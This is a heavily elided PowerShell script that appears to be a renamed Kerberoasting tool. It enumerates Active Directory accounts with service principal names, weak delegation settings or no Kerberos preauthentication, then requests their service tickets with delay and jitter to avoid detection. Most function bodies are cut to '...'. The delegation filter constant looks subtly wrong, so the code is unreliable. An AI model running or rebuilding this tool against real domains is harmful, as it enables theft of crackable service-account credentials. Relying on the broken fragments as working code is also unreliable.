    ...
    PROCESS {
        ...
        if (-not $PSBoundParameters['Server']) {
            try {
                ...
                throw "[Get-SearchDomain] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        ...
        $SearchString += $DN
        Write-Verbose "[Get-SearchDomain] search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-SearchDomain] Using alternate credentials for LDAP connection"
...
function Convert-PropertyLDAP {
        ...
        if ($_ -ne 'adspath') {
            ...
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                ...
                try {
                    ...
                    Write-Verbose "[Convert-PropertyLDAP] error: $_"
    ...
    try {
        ...
        Write-Warning "[Convert-PropertyLDAP] Error parsing LDAP properties : $_"
    }
}
	...
	$RandNo = New-Object System.Random
        ...
        ForEach ($Object in $TargetObject) {
            ...
            try {
                ...
                Write-Warning "[Get-Ticket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
...
function Get-UserDomain {
    ...
    BEGIN {
        ...
        $UserSearcher = Get-SearchDomain @SearcherArguments
    }
    ...
    PROCESS {
        if ($UserSearcher) {
            ...
            $Identity | Where-Object {$_} | ForEach-Object {
                ...
                elseif ($IdentityInstance -match '^CN=') {
                    ...
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        ...
                        Write-Verbose "[Get-UserDomain] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-SearchDomain @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-UserDomain] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                ...
                elseif ($IdentityInstance.Contains('\')) {
                    ...
                    if ($ConvertedIdentityInstance) {
                        ...
                        Write-Verbose "[Get-UserDomain] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-SearchDomain @SearcherArguments
                    }
                }
                else {
            ...
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-UserDomain] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-UserDomain] Searching for users who can be delegated'
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-UserDomain] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-UserDomain] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-UserDomain] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-UserDomain] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-UserDomain] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            ...
            Write-Verbose "[Get-UserDomain] filter string: $($UserSearcher.filter)"
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    ...
                    $User = Convert-PropertyLDAP -Properties $_.Properties
            ...
            if ($Results) {
                try { $Results.dispose() }
                    ...
                    Write-Verbose "[Get-UserDomain] Error disposing of the Results object: $_"
                }
            }
...
function Invoke-KerberoMarc {
    ...
    PROCESS {
        ...
        Get-UserDomain @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-Ticket -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }
